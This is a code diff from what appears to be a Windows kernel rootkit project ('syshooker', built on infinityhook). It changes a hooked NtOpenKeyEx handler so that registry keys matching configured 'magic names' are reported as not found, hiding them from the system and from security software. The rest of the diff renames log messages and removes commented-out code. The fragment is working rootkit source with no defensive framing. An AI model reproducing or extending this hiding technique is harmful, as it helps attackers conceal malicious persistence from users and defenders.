@@ -32,24 +32,15 @@ NTSTATUS DetourNtOpenKeyEx(
 			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
 			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
 
-			// TODO - add better way of checking if we want to hide a registry key
-			if (wcsstr(ObjectName, Settings.RegistryKeyMagicName)) {
-				kprintf("[+] infinityhook: NtOpenKeyEx: hiding %ws\n", ObjectName);
+			if (matchMagicNames(ObjectName, (Target)TARGET_REGISTRY)) {
+				kprintf("[+] syshooker: NtOpenKeyEx: hiding %ws\n", ObjectName);
 				ExFreePool(ObjectName);
 				return STATUS_OBJECT_NAME_NOT_FOUND;
 			}
 
 			ExFreePool(ObjectName); // free the buffer
 		}
-		else kprintf("[-] infinityhook: NtOpenKeyEx: failed to allocate buffer...\n");
+		else kprintf("[-] syshooker: NtOpenKeyEx: failed to allocate buffer...\n");
 	}
 	return OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes, OpenOptions);
-	
-
-	//NTSTATUS result = OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes);
-	//kprintf("[+] infinityhook: NtOpenKeyEx status: %x, handle: %p %p\n", result, pKeyHandle, *pKeyHandle);
-	//return result;
-
-	// call the original
-	//return OriginalNtOpenKeyEx(pKeyHandle, DesiredAccess, ObjectAttributes);
 }
